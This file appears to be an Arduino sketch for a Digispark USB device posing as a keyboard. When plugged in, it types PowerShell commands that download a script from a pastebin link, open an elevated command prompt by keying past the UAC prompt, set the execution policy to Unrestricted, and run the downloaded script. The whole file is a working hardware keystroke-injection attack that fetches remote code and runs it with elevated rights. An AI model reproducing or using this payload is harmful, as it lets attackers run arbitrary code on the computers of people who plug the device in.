#include "DigiKeyboard.h"
#define KEY_LEFT 0x50
#define link "https://pastebin.com/raw/e7QyYRh7"
void setup() {
}
void loop() {
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("$path = \"$env:USERPROFILE\\script2.ps1\"");
  DigiKeyboard.println("$client = new-object System.Net.WebClient");
  DigiKeyboard.println("Remove-Item $path -ErrorAction SilentlyContinue");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("$client.DownloadFile(\""link"\", $path)");
  DigiKeyboard.delay(4000);

  DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
  DigiKeyboard.delay(750);

  DigiKeyboard.println("powershell.exe -File \"%USERPROFILE%\\script2.ps1\"");
  DigiKeyboard.delay(4000);
  for (int i = 0; i < 2; i++)
  {
    DigiKeyboard.delay(300);
    DigiKeyboard.println("exit");
  }
  for(;;){} 
}
